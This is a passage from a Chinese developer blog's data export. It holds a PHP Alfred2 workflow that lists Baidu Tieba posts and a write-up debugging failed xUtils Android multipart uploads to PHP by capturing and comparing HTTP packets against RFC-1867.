class=\"title\">App</span></span></div><div class=\"line\">{</div><div class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"variable\">$_instance</span>;</div><div class=\"line\">\t<span class=\"keyword\">private</span> <span class=\"variable\">$_workflows</span>;</div><div class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>{</div><div class=\"line\">\t\t<span class=\"variable\">$this</span><span class=\"variable\">-&gt;_workflows</span> = <span class=\"keyword\">new</span> workflows();</div><div class=\"line\">\t}</div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getInstance</span><span class=\"params\">()</span></span></div><div class=\"line\">\t{</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (!<span class=\"keyword\">self</span>::<span class=\"variable\">$_instance</span> <span class=\"keyword\">instanceof</span> <span class=\"keyword\">self</span>) {</div><div class=\"line\">\t\t\t<span class=\"keyword\">self</span>::<span class=\"variable\">$_instance</span> = <span class=\"keyword\">new</span> App();</div><div class=\"line\">\t\t}</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">self</span>::<span class=\"variable\">$_instance</span>;</div><div class=\"line\">\t}</div><div class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">request</span><span class=\"params\">(<span class=\"variable\">$url</span>)</span></span></div><div class=\"line\">\t{</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"variable\">$this</span><span class=\"variable\">-&gt;_workflows</span><span class=\"variable\">-&gt;request</span>(<span class=\"variable\">$url</span>);</div><div class=\"line\">\t}</div><div class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filterDataList</span><span class=\"params\">(<span class=\"variable\">$data</span>)</span></span></div><div class=\"line\">\t{</div><div class=\"line\">\t\t<span class=\"variable\">$dataList</span> = <span class=\"keyword\">array</span>();</div><div class=\"line\">\t\tpreg_match_all(<span class=\"string\">'/&lt;div class=\"i\"&gt;(.*?)&lt;\\/div&gt;/'</span>, <span class=\"variable\">$data</span>, <span class=\"variable\">$dataList</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"variable\">$dataList</span>[<span class=\"number\">1</span>];</div><div class=\"line\">\t}</div><div class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getData</span><span class=\"params\">(<span class=\"variable\">$keyword</span>)</span></span></div><div class=\"line\">\t{</div><div class=\"line\">\t\t<span class=\"comment\">//后面可以在这里加入缓存机制</span></div><div class=\"line\">\t\t<span class=\"comment\">//缓存路径$this-&gt;_workflows-&gt;cache();</span></div><div class=\"line\">\t\t<span class=\"variable\">$url</span> = <span class=\"string\">'http://wapp.baidu.com/f?kw='</span> . <span class=\"variable\">$keyword</span>;</div><div class=\"line\">\t\t<span class=\"variable\">$data</span> = <span class=\"variable\">$this</span><span class=\"variable\">-&gt;request</span>(<span class=\"variable\">$url</span>);</div><div class=\"line\">\t\t<span class=\"variable\">$num</span> = <span class=\"number\">1</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">foreach</span>( <span class=\"variable\">$this</span><span class=\"variable\">-&gt;filterDataList</span>(<span class=\"variable\">$data</span>) <span class=\"keyword\">as</span> <span class=\"variable\">$item</span> ) {</div><div class=\"line\">\t\t\tpreg_match(<span class=\"string\">'/&lt;p&gt;(.*?)&lt;\\/p&gt;/'</span>, <span class=\"variable\">$item</span>, <span class=\"variable\">$time</span>);</div><div class=\"line\">\t\t\tpreg_match(<span class=\"string\">'/kz=(.*?)&amp;/'</span>, <span class=\"variable\">$item</span>, <span class=\"variable\">$id</span>);</div><div class=\"line\">\t\t\t<span class=\"variable\">$time</span>= <span class=\"string\">\" \"</span> . str_replace(<span class=\"string\">'&#160;'</span>, <span class=\"string\">' '</span>, <span class=\"variable\">$time</span>[<span class=\"number\">1</span>]);</div><div class=\"line\">\t\t\tpreg_match(<span class=\"string\">'/&lt;a (.*?)&gt;(.*?)&lt;\\/a&gt;/'</span>,<span class=\"variable\">$item</span>, <span class=\"variable\">$title</span>);</div><div class=\"line\">\t\t\t<span class=\"variable\">$item</span> = str_replace(<span class=\"string\">'&#160;'</span>, <span class=\"string\">''</span>, <span class=\"variable\">$title</span>[<span class=\"number\">2</span>]);</div><div class=\"line\">\t\t\t<span class=\"variable\">$this</span><span class=\"variable\">-&gt;_workflows</span><span class=\"variable\">-&gt;result</span>(<span class=\"variable\">$num</span> . <span class=\"string\">'.'</span> . time(), <span class=\"string\">'http://tieba.baidu.com/p/'</span> . <span class=\"variable\">$id</span>[<span class=\"number\">1</span>], <span class=\"variable\">$item</span>, <span class=\"variable\">$time</span>, <span class=\"string\">'icon.png'</span>);</div><div class=\"line\">\t\t\t<span class=\"variable\">$num</span> ++;</div><div class=\"line\">\t\t}</div><div class=\"line\">\t\t</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"variable\">$this</span><span class=\"variable\">-&gt;_workflows</span><span class=\"variable\">-&gt;toxml</span>();</div><div class=\"line\">\t}</div><div class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">run</span><span class=\"params\">(<span class=\"variable\">$query</span>)</span></span></div><div class=\"line\">\t{</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"variable\">$this</span><span class=\"variable\">-&gt;getData</span>(<span class=\"variable\">$query</span>);</div><div class=\"line\">\t}</div><div class=\"line\">}</div><div class=\"line\"><span class=\"comment\">#echo App::getInstance()-&gt;run('大主宰');</span></div><div class=\"line\"><span class=\"preprocessor\">?&gt;</span></div></pre></td></tr></table></figure>\n\n<p>当然你也可以去github下载： <a href=\"https://github.com/creturn/alfredwordflow-tieba\" target=\"_blank\" rel=\"external\">https://github.com/creturn/alfredwordflow-tieba</a></p>\n","source":"_posts/alfred2-的workflow-开发实例-百度贴吧插件.md","raw":"title: \"Alfred2 的workflow 开发实例-百度贴吧插件\"\nid: 314\ndate: 2013-07-06 15:22:05\ntags: \n- alfred\n- os x\n- php\n- workflow\ncategories: \n- 原创作品\n- 技术文章\n---\n\n貌似有点懒，今年第二篇…\n\nAlfred2 os x 上的一个比较好的插件好的插件，对于命令控来说绝对是福音。\n\n官网地址：http://www.alfredapp.com\n\n它的插件机制加上新版本的workflow支持fallback后似的他的更受欢迎。\n\n先上一张今天要介绍的插件，贴吧的workflow。自己平时比较喜欢在贴吧里面看小说。\n\n之前找了一个贴吧的插件，不过用起来发现作者采用了缓存机制，其实加入缓存机制其实还是\n\n比较好的，不过缓存了一天多都没变化这个就有问题了。本来想直接修改原来的插件去掉缓存机制或者\n\n把缓存时间修改短点也行，但是发现是python运行编译的文件，去作者github上的看看能找到源码不结果\n\n令人很失望，一个这么简单的东西放了那么一大堆不知道都起什么作用的包，还不开放源码，还敢用吗？\n\n<!--more-->\n\n所以果断删掉，自己写。先看看效果图：\n\n[![QQ20131106-6](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-6.png)](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-6.png)\n\n1\\. 首先从百度贴吧抓取贴吧对应的帖子，我们知道pc端访问http://tieba.baidu.com/f?kw=吧名 就可以访问贴吧的帖子\n\n不过为了加快访问速度和效率，我们可以抓取手机端贴吧帖子。手机端贴吧帖子页面大小相对pc端要小很多。所以获取\n\n贴吧帖子信息速度会快很多，贴吧手机版本地址为：wapp.baidu.com/f?kw=吧名\n\n2\\. 抓取到信息后用正则过滤出我们需要的内容然后生成相应的xml这样就可以实现我们自己的workflow\n\n代码如下：\n\n```php\n<?php\n/*========================================================================\n#   FileName: mytieba.php\n#     Author: Creturn\n#      Email: master@creturn.com\n#   HomePage: http://www.creturn.com\n# LastChange: 2013-07-05 02:24:51\n========================================================================*/\nrequire_once('workflows.php');\nclass App\n{\n\tprivate static $_instance;\n\tprivate $_workflows;\n\tfunction __construct(){\n\t\t$this->_workflows = new workflows();\n\t}\n\t\n\tpublic function getInstance()\n\t{\n\t\tif (!self::$_instance instanceof self) {\n\t\t\tself::$_instance = new App();\n\t\t}\n\t\treturn self::$_instance;\n\t}\n\tpublic function request($url)\n\t{\n\t\treturn $this->_workflows->request($url);\n\t}\n\tpublic function filterDataList($data)\n\t{\n\t\t$dataList = array();\n\t\tpreg_match_all('/<div class=\"i\">(.*?)<\\/div>/', $data, $dataList);\n\t\treturn $dataList[1];\n\t}\n\tpublic function getData($keyword)\n\t{\n\t\t//后面可以在这里加入缓存机制\n\t\t//缓存路径$this->_workflows->cache();\n\t\t$url = 'http://wapp.baidu.com/f?kw=' . $keyword;\n\t\t$data = $this->request($url);\n\t\t$num = 1;\n\t\tforeach( $this->filterDataList($data) as $item ) {\n\t\t\tpreg_match('/<p>(.*?)<\\/p>/', $item, $time);\n\t\t\tpreg_match('/kz=(.*?)&amp;/', $item, $id);\n\t\t\t$time= \" \" . str_replace('&#160;', ' ', $time[1]);\n\t\t\tpreg_match('/<a (.*?)>(.*?)<\\/a>/',$item, $title);\n\t\t\t$item = str_replace('&#160;', '', $title[2]);\n\t\t\t$this->_workflows->result($num . '.' . time(), 'http://tieba.baidu.com/p/' . $id[1], $item, $time, 'icon.png');\n\t\t\t$num ++;\n\t\t}\n\t\t\n\t\treturn $this->_workflows->toxml();\n\t}\n\tpublic function run($query)\n\t{\n\t\treturn $this->getData($query);\n\t}\n}\n#echo App::getInstance()->run('大主宰');\n?>\n\n```\n\n当然你也可以去github下载： [https://github.com/creturn/alfredwordflow-tieba](https://github.com/creturn/alfredwordflow-tieba)\n","slug":"alfred2-的workflow-开发实例-百度贴吧插件","updated":1421659126000,"excerpt":"<p>貌似有点懒，今年第二篇…</p>\n<p>Alfred2 os x 上的一个比较好的插件好的插件，对于命令控来说绝对是福音。</p>\n<p>官网地址：<a href=\"http://www.alfredapp.com\" target=\"_blank\" rel=\"external\">http://www.alfredapp.com</a></p>\n<p>它的插件机制加上新版本的workflow支持fallback后似的他的更受欢迎。</p>\n<p>先上一张今天要介绍的插件，贴吧的workflow。自己平时比较喜欢在贴吧里面看小说。</p>\n<p>之前找了一个贴吧的插件，不过用起来发现作者采用了缓存机制，其实加入缓存机制其实还是</p>\n<p>比较好的，不过缓存了一天多都没变化这个就有问题了。本来想直接修改原来的插件去掉缓存机制或者</p>\n<p>把缓存时间修改短点也行，但是发现是python运行编译的文件，去作者github上的看看能找到源码不结果</p>\n<p>令人很失望，一个这么简单的东西放了那么一大堆不知道都起什么作用的包，还不开放源码，还敢用吗？</p>\n","_id":"sxqmjnrcij35mwmq","comments":true,"layout":"post","photos":[],"link":""},{"title":"Android 上传PHP xUtils Bug修复分析过程","date":1389769924000,"tags":["46j3s9p0yhksf8z6","dcpcji0h6rz0w7s6"],"content":"<h2 id=\"起因\">起因</h2>\n<p>作为全职PHPer偶尔需要客串下Androider,最近公司的一个项目需要Android的客户端(主要图片特效处理及其上传)，自己就客串下Androider.</p>\n<p>之前有过Android开发经验所以做这个挺顺手的，几乎所有东西直接github中拿过来改改就用，不过在处理图片上传的时候选择了xUtils这个</p>\n<p>开源工具类,用起来确实比较好用，挺方便的，例如如下代码就可以实现上传:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div></pre></td><td class=\"code\"><pre><div class=\"line\">RequestParams params = <span class=\"keyword\">new</span> RequestParams();</div><div class=\"line\">params.addBodyParameter(<span class=\"string\">\"file\"</span>, file);</div><div class=\"line\">HttpUtils httpUtils = <span class=\"keyword\">new</span> HttpUtils();</div><div class=\"line\">httpUtils.send(HttpRequest.HttpMethod.POST, UPLOAD_URL, params, <span class=\"keyword\">new</span> RequestCallBack&lt;String&gt;() {</div><div class=\"line\">    <span class=\"annotation\">@Override</span></div><div class=\"line\">    <span class=\"comment\">//上传失败处理方法</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onFailure</span>(HttpException arg0, String msg) {</div><div class=\"line\">        alert(msg);</div><div class=\"line\">    }</div><div class=\"line\">    <span class=\"annotation\">@Override</span></div><div class=\"line\">    <span class=\"comment\">//上传进度处理</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onLoading</span>(<span class=\"keyword\">long</span> total, <span class=\"keyword\">long</span> current,</div><div class=\"line\">            <span class=\"keyword\">boolean</span> isUploading) {</div><div class=\"line\">        <span class=\"keyword\">if</span> (isUploading) {</div><div class=\"line\">            Log.i(LOG_NAME, <span class=\"string\">\"upload:\"</span> + current + <span class=\"string\">\"/\"</span> + total);</div><div class=\"line\">        }</div><div class=\"line\">    }</div><div class=\"line\">    <span class=\"annotation\">@Override</span></div><div class=\"line\">    <span class=\"comment\">//上传成功处理</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onSuccess</span>(ResponseInfo&lt;String&gt; responseInfo) {</div><div class=\"line\">        alert(responseInfo.result);</div><div class=\"line\">        Log.i(LOG_NAME, responseInfo.result);</div><div class=\"line\">    }</div><div class=\"line\">});</div></pre></td></tr></table></figure>\n\n<p>可以看到用起来比较方便，如果自己写还是比较麻烦的。不过最让人头疼的不是使用方法，而是作为接收端为PHP的话是接收不到上传的文件，最后经证实<br>不仅仅是PHP C# 也有问题, 网上搜素了下不少人都遇到问题不过没有解决方案，看来只能自己动手解决了<br><a id=\"more\"></a></p>\n<h2 id=\"问题分析\">问题分析</h2>\n<p>既然要解决问题，那么就需要分析bug可能出现的地方，既然是HTTP上传那么我们得知道在PHP 在HTTP协议中文件是怎么处理上传的，直接在官方文档<br>就可以找到</p>\n<blockquote>\n<p>PHP 能够接受任何来自符合 RFC-1867 标准的浏览器（包括 Netscape Navigator 3 及更高版本，打了补丁的 Microsoft Internet Explorer 3 或者更高版本）上传的文件。</p>\n</blockquote>\n<p>这个是PHP官方文档中给出的解释, PHP在处理上传的时候遵循的是RFC-1867标准，那么我们接下来看看什么是RFC-1867。</p>\n<p>这里我给出一个RFC-1867的说明文档地址 <a href=\"http://www.ietf.org/rfc/rfc1867.txt\" target=\"_blank\" rel=\"external\">RFC-1867 说明</a>，太长了就不放在这里了只拿核心重点内容过来看看：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"># The client might send back the following data use POST method:</div><div class=\"line\"></div><div class=\"line\">Content-type: multipart/form-data, boundary=AaB03x</div><div class=\"line\"></div><div class=\"line\">--AaB03x</div><div class=\"line\">content-disposition: form-data; name=\"field1\"</div><div class=\"line\"></div><div class=\"line\">Joe Blow</div><div class=\"line\">--AaB03x</div><div class=\"line\">content-disposition: form-data; name=\"pics\"; filename=\"file1.txt\"</div><div class=\"line\">Content-Type: text/plain</div><div class=\"line\"></div><div class=\"line\"> ... contents of file1.txt ...</div><div class=\"line\">--AaB03x--</div></pre></td></tr></table></figure>\n\n<p>这里通俗点讲，RFC-1867通过HTTP协议传输特定的格式来实现上传文件,比如我们上传一个文件名字叫做hello.txt的文本到服务端，那么发起请求的HTTP格式应该就如下：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"request\">POST <span class=\"string\">/up.php</span> HTTP/1.1</span></div><div class=\"line\"><span class=\"attribute\">Host</span>: <span class=\"string\">creturn.com</span></div><div class=\"line\"><span class=\"attribute\">Content-Length</span>: <span class=\"string\">294</span></div><div class=\"line\"><span class=\"attribute\">Content-type</span>: <span class=\"string\">multipart/form-data, boundary=AaB03x</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"applescript\"><span class=\"comment\">--AaB03x</span></span></div><div class=\"line\">content-disposition: form-data; <span class=\"property\">name</span>=<span class=\"string\">\"file\"</span>; filename=<span class=\"string\">\"hello.txt\"</span></div><div class=\"line\">Content-Type: <span class=\"type\">text</span>/plain</div><div class=\"line\"></div><div class=\"line\">hello</div><div class=\"line\"><span class=\"comment\">--AaB03x--</span></div></pre></td></tr></table></figure>\n\n<p>这里HTTP头部协议没有写完整只是为了说明问题写的格式。在这些描述信息中</p>\n<ol>\n<li>第一个Content-type（http头部描述信息）值multipart/form-data 是告诉服务器此次发送的数据是上传文件数据, boundary是告诉服务器文件数据之间分割标示符是 AaB03x</li>\n<li>在HTTP body数据中以—AaB03x 分割多个文件，每个分隔符下面的描述信息是作为上传文件的描述信息</li>\n<li>发送结束后需要以分隔符加“—”符号进行标示</li>\n</ol>\n<p>如果这三点没有问题那么就能正确上传，当然次实例中肯定不成功因为HTTP头部协议描述信息简短切不争取（比如长度）</p>\n<h2 id=\"解决过程\">解决过程</h2>\n<p>既然上面已经对问题进行分析了，同样也知道了只要发送过程是按照RFC-1867的标准进行发送那么至少PHP是能够接收到上传的文件，那么接下来我们要解决的就是如果判断</p>\n<p>或者查看xUtils发送文件过程中是否遵循了RFC-1867标准</p>\n<p>那么如何查看xUtils是否发送了正确的数据格式？ 有两种方案，一个是利用代理工具抓包，另外一个方案就是直接抓包</p>\n<p>这里就说说直接抓包，代理抓包可以google一大堆。</p>\n<p>pc 上面建立无线热点分享给手机，这样所有的数据都通过电脑走，不会用pc分享热点的google一大堆，或者为了偷懒买个传说中的mini WIFI都行</p>\n<p>抓包工具window推荐smartSniff, linux或者os x直接就tcpdump也行</p>\n<p>先写个简单的app装到手机上这里给出上传代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\">String UPLOAD_URL = <span class=\"string\">\"http://www.creturn.com/up.php\"</span>;</div><div class=\"line\">File file = <span class=\"keyword\">new</span> File(Environment.getExternalStorageDirectory() ,<span class=\"string\">\"hello.txt\"</span>);</div><div class=\"line\">RequestParams params = <span class=\"keyword\">new</span> RequestParams();</div><div class=\"line\">params.addBodyParameter(<span class=\"string\">\"file\"</span>, file);</div><div class=\"line\">HttpUtils httpUtils = <span class=\"keyword\">new</span> HttpUtils();</div><div class=\"line\">httpUtils.send(HttpRequest.HttpMethod.POST, UPLOAD_URL, params, <span class=\"keyword\">new</span> RequestCallBack&lt;String&gt;() {</div><div class=\"line\">    <span class=\"annotation\">@Override</span></div><div class=\"line\">    <span class=\"comment\">//上传失败处理方法</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onFailure</span>(HttpException arg0, String msg) {</div><div class=\"line\">        alert(msg);</div><div class=\"line\">    }</div><div class=\"line\">    <span class=\"annotation\">@Override</span></div><div class=\"line\">    <span class=\"comment\">//上传进度处理</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onLoading</span>(<span class=\"keyword\">long</span> total, <span class=\"keyword\">long</span> current,</div><div class=\"line\">            <span class=\"keyword\">boolean</span> isUploading) {</div><div class=\"line\">        <span class=\"keyword\">if</span> (isUploading) {</div><div class=\"line\">            Log.i(LOG_NAME, <span class=\"string\">\"upload:\"</span> + current + <span class=\"string\">\"/\"</span> + total);</div><div class=\"line\">        }</div><div class=\"line\">    }</div><div class=\"line\">    <span class=\"annotation\">@Override</span></div><div class=\"line\">    <span class=\"comment\">//上传成功处理</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onSuccess</span>(ResponseInfo&lt;String&gt; responseInfo) {</div><div class=\"line\">        alert(responseInfo.result);</div><div class=\"line\">        Log.i(LOG_NAME, responseInfo.result);</div><div class=\"line\">    }</div><div class=\"line\">});</div></pre></td></tr></table></figure>\n\n<p>上面代码作用是把sdcard根目录的hello.txt文件上传到UPLOAD_URL, 所以在sdcard根目录放一个hello.txt文件里面内容随便写点</p>\n<p>php服务端这边就直接打印上传的文件信息就行，代码很简单:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\">print_r(<span class=\"variable\">$_FILES</span>);</div><div class=\"line\"><span class=\"preprocessor\">?&gt;</span></div></pre></td></tr></table></figure>\n\n<p>如果上传成功就会反馈上传文件的信息，写好app装到手机连接好wifi然后在pc上面抓包，我这里用的是smart sniffer</p>\n<ul>\n<li><p>抓包</p>\n<ol>\n<li>打开smart sniffer </li>\n<li>选择菜单 Options -&gt; Capture Options </li>\n<li>选择你分享wifi的网卡</li>\n<li>确定点击开始抓包</li>\n</ol>\n<p>在手机app上操作上传文件时候就可以看到抓包工具中已经有相应的http数据，抓包工具会对所有流量抓取所以如果有其他包干扰还可以</p>\n<p>设置相应的过滤规则，这里就不阐述google就能找到</p>\n<p>看看我们抓到的包内容:</p>\n</li>\n</ul>\n<p><img src=\"http://asset.creturn.com/asset/img/android_sniffer.png\" alt=\"smart sniffer抓包内容\"></p>\n<p>图种可以看到我们上传的HTTP包信息，不过很明显反馈的信息提示是没有上传成功的。</p>\n<p>那么接下来我们怎么去分析这个？怎么去排查问题？很多人应该能够想到，要是有个正确参照物不就很容易分析出问题出处？</p>\n<p>那么我们在建立一个html文件用浏览器同样上传sdcard里面的hello.txt文件,html内容如下:</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">html</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">body</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">form</span> <span class=\"attribute\">action</span>=<span class=\"value\">\"http://www.creturn.com/up.php\"</span> <span class=\"attribute\">method</span>=<span class=\"value\">\"post\"</span> <span class=\"attribute\">enctype</span>=<span class=\"value\">\"multipart/form-data\"</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">label</span> <span class=\"attribute\">for</span>=<span class=\"value\">\"file\"</span>&gt;</span>Filename:<span class=\"tag\">&lt;/<span class=\"title\">label</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">input</span> <span class=\"attribute\">type</span>=<span class=\"value\">\"file\"</span> <span class=\"attribute\">name</span>=<span class=\"value\">\"file\"</span> <span class=\"attribute\">id</span>=<span class=\"value\">\"file\"</span> /&gt;</span> </div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">br</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">input</span> <span class=\"attribute\">type</span>=<span class=\"value\">\"submit\"</span> <span class=\"attribute\">name</span>=<span class=\"value\">\"submit\"</span> <span class=\"attribute\">value</span>=<span class=\"value\">\"Submit\"</span> /&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">form</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">body</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"title\">html</span>&gt;</span></div></pre></td></tr></table></figure>\n\n<p> 用同样的方法抓包看看正确的包内容是什么样的:</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"request\">POST <span class=\"string\">/up.php</span> HTTP/1.1</span></div><div class=\"line\"><span class=\"attribute\">Host</span>: <span class=\"string\">www.creturn.com</span></div><div class=\"line\"><span class=\"attribute\">Connection</span>: <span class=\"string\">keep-alive</span></div><div class=\"line\"><span class=\"attribute\">Content-Length</span>: <span class=\"string\">294</span></div><div class=\"line\"><span class=\"attribute\">Cache-Control</span>: <span class=\"string\">max-age=0</span></div><div class=\"line\"><span class=\"attribute\">Accept</span>: <span class=\"string\">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></div><div class=\"line\"><span class=\"attribute\">Origin</span>: <span class=\"string\">http://222.73.234.196</span></div><div class=\"line\"><span class=\"attribute\">User-Agent</span>: <span class=\"string\">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36</span></div><div class=\"line\"><span class=\"attribute\">Content-Type</span>: <span class=\"string\">multipart/form-data; boundary=----WebKitFormBoundaryIexdOW8e2EZyciDK</span></div><div class=\"line\"><span class=\"attribute\">Referer</span>: <span class=\"string\">http://222.73.234.196/up.html</span></div><div class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: <span class=\"string\">gzip,deflate,sdch</span></div><div class=\"line\"><span class=\"attribute\">Accept-Language</span>: <span class=\"string\">zh-CN,zh;q=0.8</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"applescript\"><span class=\"comment\">------WebKitFormBoundaryIexdOW8e2EZyciDK</span></span></div><div class=\"line\">Content-Disposition: form-data; <span class=\"property\">name</span>=<span class=\"string\">\"file\"</span>; filename=<span class=\"string\">\"hello.txt\"</span></div><div class=\"line\">Content-Type: <span class=\"type\">text</span>/plain</div><div class=\"line\"></div><div class=\"line\">hello upload</div><div class=\"line\"><span class=\"comment\">------WebKitFormBoundaryIexdOW8e2EZyciDK</span></div><div class=\"line\">Content-Disposition: form-data; <span class=\"property\">name</span>=<span class=\"string\">\"submit\"</span></div><div class=\"line\"></div><div class=\"line\">Submit</div><div class=\"line\"><span class=\"comment\">------WebKitFormBoundaryIexdOW8e2EZyciDK--</span></div></pre></td></tr></table></figure>\n\n<p> 可以看到处理HTTP头部描述信息和包体里面多了一个Submit，几乎一样</p>\n<p>之前说过上传过程中的几个重点，然后对比下我们发现Content-Type描述信息多了一个charset字符编码描述信息</p>\n<p>那么要做测试的话肯定就要把不同的地方去掉，然后对包进行回放看看是否成功</p>\n<blockquote>\n<p>包回放指的是包数据包重新发送一次</p>\n</blockquote>\n<p>回放数据包有两种方法，一种直接修改xUtils源码重新上传。这里说一个简单的方法window自带的telnet ,用telnet 链接服务器80端口</p>\n<p>手动发送数据</p>\n<blockquote>\n<p>注意： windows7默认没有安装需要在控制面板-&gt;程序和功能-&gt;打开或者关闭windows功能中开启</p>\n</blockquote>\n<p>如何进行手动发送？按照我们之前的想法去掉charset描述信息然后手动发送，那么先去掉charset信息后的包内容放入记事本:</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"request\">POST <span class=\"string\">/up.php</span> HTTP/1.1</span></div><div class=\"line\"><span class=\"attribute\">User-Agent</span>: <span class=\"string\">Mozilla/5.0 (Macintosh; Intel Mac OS X 